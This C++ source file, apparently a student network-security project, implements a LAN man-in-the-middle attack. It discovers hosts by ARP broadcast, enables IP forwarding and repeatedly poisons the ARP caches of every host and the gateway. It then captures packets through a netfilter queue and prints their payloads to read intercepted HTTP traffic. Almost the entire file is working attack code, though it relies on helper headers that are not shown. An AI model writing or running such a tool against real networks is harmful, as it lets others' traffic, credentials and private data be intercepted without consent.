#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cerrno>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <linux/if_packet.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <time.h>

#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

#include "arp.h"
#include "scan.h"
#include "spoof.h"
#include "mitm_attack.h"

#define NF_DROP 0
#define NF_ACCEPT 1

using namespace std;

/**
 * target all the neighbors in the local network
 * @param gateway_ip the ip address of gateway in std::string
 * @param answered_list the list of all the hosts in the local area network
 * @param spoof_operator the spoof operator
 */

struct nfq_handle *h;
struct nfq_q_handle *qh;
struct nfnl_handle *nh;
void fetch_information(struct nfq_handle *h, struct nfq_q_handle *qh, struct nfnl_handle *nh, int fd);
int fd;

void arp_spoofing(string gateway_ip, vector<pair<string, string>> answered_list, SpoofOperator *spoof_operator) {
    // run for 100 iterations
    for (int t = 0; t < 100; t++) {
        std::cout << "spoofing iteration: " << t << std::endl;

        //simultaenously fetch the HTTP packets from the gateway and the hosts
        fetch_information(h, qh, nh, fd);

        for (auto i = 0; i < answered_list.size(); i++) {
            if (answered_list[i].first != gateway_ip) {
                spoof_operator->attack(answered_list[i].first, gateway_ip);
                spoof_operator->attack(gateway_ip, answered_list[i].first);
            }
        }
        sleep(2);
    }
}

//參數分別是代表指向netfilter queue的指標、代表netfilter message的指標、代表netfilter data的指標、使用者資料
static int Callback(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){

    struct nfqnl_msg_packet_hdr *ph;  //代表netfilter packet header的指標
    unsigned char *payload; //代表netfilter payload的指標
    int ret; //代表回傳值的變數

    //取得netfilter packet header
    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph){
        //取得netfilter packet ID
        printf("Received packet with ID %u\n", ntohl(ph->packet_id));
    }
    
    //取得netfilter payload
    ret = nfq_get_payload(nfa, &payload);
    if (ret >= 0)
    {   //印出netfilter payload的長度
        printf("Payload Length: %d\n", ret);

        //印出netfilter payload的內容
        for (int i = 0; i < ret; i++){
            printf("%c", payload[i]);
        }
    }
    printf("\n");

    return 0;
}

void fetch_information(struct nfq_handle *h, struct nfq_q_handle *qh, struct nfnl_handle *nh, int fd){
    int rv; //代表回傳值的變數
    char buf[4096] __attribute__((aligned)); //for packet data
    
    //open libraray handle
    h = nfq_open();
    if (!h){
        fprintf(stderr, "Error during nfq_open()\n");
        exit(1);
    }

    //unbinding existing nf_queue handler for AF_INET (if any)
    if (nfq_unbind_pf(h, AF_INET) < 0){
        fprintf(stderr, "Error during nfq_unbind_pf()\n");
        exit(1);
    }

    //binding nfnetlink_queue as nf_queue handler for AF_INET
    if (nfq_bind_pf(h, AF_INET) < 0){
        fprintf(stderr, "Error during nfq_bind_pf()\n");
        exit(1);
    }

    //binding this socket to queue '0'
    qh = nfq_create_queue(h, 0, &Callback, NULL);
    if (!qh){
        fprintf(stderr, "Error during nfq_create_queue()\n");
        exit(1);
    }

    //setting copy_packet mode
    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0){
        fprintf(stderr, "Can't set packet_copy mode\n");
        exit(1);
    }

    //get netlink handle
    nh = nfq_nfnlh(h);
    if (!nh)
    {
        fprintf(stderr, "Error during nfq_nfnlh()\n");
        exit(1);
    }

    //get file descriptor associated with the nfqueue
    fd = nfq_fd(h);
    if (!fd)
    {
        fprintf(stderr, "Error getting file descriptor for nfqueue\n");
        exit(1);
    }

    //receive packets from the nfqueue
    if(rv = recv(fd, buf, sizeof(buf), 0)>0){
        nfq_handle_packet(h, buf, rv);
    }
    
    //destroy queue handle
    nfq_destroy_queue(qh);
    nfq_close(h);
    
}


int main() {
    std::string sender_mac, target_mac;
    std::string sender_ip, target_ip, netmask, ifname;
    std::string gateway_ip;
    
    // iterate through all network interfaces
    // stops if ifname != "lo"
    get_network_interface_info(sender_ip, netmask, sender_mac, ifname);
    gateway_ip = get_gateway(ifname);

    std::vector<std::string> candidates;
    std::vector<std::pair<std::string, std::string>> answered_list;
    std::map<std::string, std::string> ip2mac_map;

    // use ip and netmask to calculate all possible neighbors
    get_host_in_range(sender_ip, netmask, candidates);

    // initiation of self defined arp operator
    // used to initialize & send & recv arp packets
    ARPOperator arp_operator(sender_ip, ifname);

    // initialize broadcast for neighbor discovery
    target_mac = "00:00:00:00:00:00";

    arp_operator.prepare_broadcast();
    arp_operator.prepare_header_values();
    for (auto candidate : candidates) {
        arp_operator.set_target(candidate, target_mac);
        arp_operator.send();
    }

    // set timeout
    // don't know how to set the actual timeout window
    arp_operator.clear_buffer();
    arp_operator.set_timeout(2, 0);
    int nbytes;
    std::string host_ip, host_mac;

    // print the banner
    std::cout << "Available devices" << std::endl;
    std::cout << "---------------------------------" << std::endl;
    std::cout << "IP\t\tMAC\t\t" << std::endl;
    std::cout << "---------------------------------" << std::endl;

    // recv packets continuously until timeout
    while (true) {
        nbytes = arp_operator.recv();
        if (nbytes < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // timeout
                break;
            } else {
                perror("arp_operator.recv() failed");
                exit(EXIT_FAILURE);
            }
        } else if (arp_operator.get_candidate_response(host_ip, host_mac)) {
            std::cout << host_ip << "\t" << host_mac << std::endl;
            answered_list.push_back(std::make_pair(host_ip, host_mac));
            ip2mac_map[host_ip] = host_mac;
        }
    }

    arp_operator.clear_buffer();

    // choose the first target that is not the gateway
    std::map<std::string, std::string>::iterator it;
    for (it = ip2mac_map.begin(); it != ip2mac_map.end(); it++) {
        if (it->first != gateway_ip) {
            target_ip = it->first;
            target_mac = it->second;
        }
    }

    // initialize the spoof operator
    SpoofOperator spoof_operator(&arp_operator, gateway_ip, &ip2mac_map);

    if (set_ip_forwarding(1) < 0) {
        exit(EXIT_FAILURE);
    }

    arp_operator.prepare_unicast();
    arp_operator.prepare_header_values();

    arp_spoofing(gateway_ip, answered_list, &spoof_operator);

    return 0;
}


